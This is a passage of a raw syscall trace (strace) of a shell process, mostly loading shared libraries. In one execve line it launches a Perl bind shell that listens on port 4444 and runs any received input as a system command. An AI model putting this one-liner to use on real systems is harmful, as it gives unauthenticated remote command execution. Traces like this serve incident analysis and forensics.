\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
7442  07:18:47.707956 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
7442  07:18:47.707974 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d94000
7442  07:18:47.707999 mmap2(0xb7d9b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d9b000
7442  07:18:47.708015 close(1)          = 0
7442  07:18:47.708027 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.708040 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
7442  07:18:47.708054 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
7442  07:18:47.708138 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
7442  07:18:47.708155 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d7c000
7442  07:18:47.708166 mmap2(0xb7d90000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d90000
7442  07:18:47.708180 mmap2(0xb7d92000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d92000
7442  07:18:47.708194 close(1)          = 0
7442  07:18:47.708219 munmap(0xb7f22000, 29913) = 0
7442  07:18:47.708235 open("/etc/ld.so.cache", O_RDONLY) = 1
7442  07:18:47.708251 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7442  07:18:47.708268 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f22000
7442  07:18:47.708277 close(1)          = 0
7442  07:18:47.708287 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.708301 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
7442  07:18:47.708323 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7442  07:18:47.708456 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
7442  07:18:47.708473 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d72000
7442  07:18:47.708485 mmap2(0xb7d7a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d7a000
7442  07:18:47.708501 close(1)          = 0
7442  07:18:47.708513 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7442  07:18:47.708526 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
7442  07:18:47.708540 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7442  07:18:47.708627 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
7442  07:18:47.708644 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d67000
7442  07:18:47.708655 mmap2(0xb7d70000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d70000
7442  07:18:47.708671 close(1)          = 0
7442  07:18:47.708692 munmap(0xb7f22000, 29913) = 0
7442  07:18:47.708707 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
7442  07:18:47.708721 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
7442  07:18:47.708733 _llseek(1, 0, [0], SEEK_CUR) = 0
7442  07:18:47.708744 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
7442  07:18:47.708760 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f29000
7442  07:18:47.708771 _llseek(1, 1624, [1624], SEEK_SET) = 0
7442  07:18:47.708789 munmap(0xb7f29000, 1624) = 0
7442  07:18:47.708799 close(1)          = 0
7442  07:18:47.709151 getpgrp()         = 3831
7442  07:18:47.709223 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
7442  07:18:47.709268 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
7442  07:18:47.709300 brk(0x8101000)    = 0x8101000
7442  07:18:47.709343 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7442  07:18:47.709360 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7442  07:18:47.709374 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7442  07:18:47.709410 brk(0x8102000)    = 0x8102000
7442  07:18:47.709436 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7442  07:18:47.709455 stat64("/sbin/AB", 0xbfd30b88) = -1 ENOENT (No such file or directory)
7442  07:18:47.709467 stat64("/bin/AB", 0xbfd30b88) = -1 ENOENT (No such file or directory)
7442  07:18:47.709478 stat64("/usr/sbin/AB", 0xbfd30b88) = -1 ENOENT (No such file or directory)
7442  07:18:47.709489 stat64("/usr/bin/AB", 0xbfd30b88) = -1 ENOENT (No such file or directory)
7442  07:18:47.709502 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
7442  07:18:47.709516 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9d6f8) = 7443
7443  07:18:47.709560 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7443  07:18:47.709576 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
7443  07:18:47.709589 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
7443  07:18:47.709601 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
7443  07:18:47.709626 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7443  07:18:47.709672 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7443  07:18:47.709701 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
7443  07:18:47.709787 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
7443  07:18:47.709801 --- SIGPIPE (Broken pipe) @ 0 (0) ---
7443  07:18:47.709869 exit_group(127)   = ?
7442  07:18:47.715092 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7442  07:18:47.715093 --- SIGCHLD (Child exited) @ 0 (0) ---
7442  07:18:47.715093 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 7443
7442  07:18:47.715093 waitpid(-1, 0xbfd30808, WNOHANG) = -1 ECHILD (No child processes)
4519  07:18:47.715093 waitpid(7442,  <unfinished ...>
7442  07:18:47.715093 sigreturn()       = ? (mask now [])
7442  07:18:47.715094 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7442  07:18:47.715094 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7442  07:18:47.715094 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7442  07:18:47.715094 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
7442  07:18:47.715094 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7442  07:18:47.715103 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
7442  07:18:47.715136 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7442  07:18:47.715154 stat64("/sbin/perl", 0xbfd30bb8) = -1 ENOENT (No such file or directory)
7442  07:18:47.715166 stat64("/bin/perl", 0xbfd30bb8) = -1 ENOENT (No such file or directory)
7442  07:18:47.715177 stat64("/usr/sbin/perl", 0xbfd30bb8) = -1 ENOENT (No such file or directory)
7442  07:18:47.715189 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
7442  07:18:47.715206 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
7442  07:18:47.715230 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
7442  07:18:47.715244 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9d6f8) = 7444
7444  07:18:47.715325 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7444  07:18:47.715358 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
7444  07:18:47.715371 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
7444  07:18:47.715383 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
7444  07:18:47.715397 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7444  07:18:47.715412 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7444  07:18:47.715425 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
7444  07:18:47.715460 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
7444  07:18:47.715540 brk(0)            = 0x8153000
7444  07:18:47.715558 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.715573 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd6000
7444  07:18:47.715588 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.715604 open("/etc/ld.so.cache", O_RDONLY) = 1
7444  07:18:47.715616 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7444  07:18:47.715632 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fce000
7444  07:18:47.715643 close(1)          = 0
7444  07:18:47.715653 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.715667 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
7444  07:18:47.715681 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
7444  07:18:47.715809 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
7444  07:18:47.715843 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fca000
7444  07:18:47.715870 mmap2(0xb7fcc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fcc000
7444  07:18:47.715886 close(1)          = 0
7444  07:18:47.715898 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.715912 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
7444  07:18:47.715939 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
7444  07:18:47.716025 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
7444  07:18:47.716042 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa5000
7444  07:18:47.716056 mmap2(0xb7fc8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fc8000
7444  07:18:47.716071 close(1)          = 0
7444  07:18:47.716083 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.716096 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
7444  07:18:47.716110 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
7444  07:18:47.716194 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
7444  07:18:47.716210 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa4000
7444  07:18:47.716223 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8c000
7444  07:18:47.716233 mmap2(0xb7fa0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7fa0000
7444  07:18:47.716247 mmap2(0xb7fa2000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fa2000
7444  07:18:47.716270 close(1)          = 0
7444  07:18:47.716309 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.716340 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
7444  07:18:47.716353 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
7444  07:18:47.716440 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
7444  07:18:47.716457 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e3d000
7444  07:18:47.716468 mmap2(0xb7f86000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f86000
7444  07:18:47.716482 mmap2(0xb7f89000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f89000
7444  07:18:47.716495 close(1)          = 0
7444  07:18:47.716506 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7444  07:18:47.716518 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
7444  07:18:47.716535 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 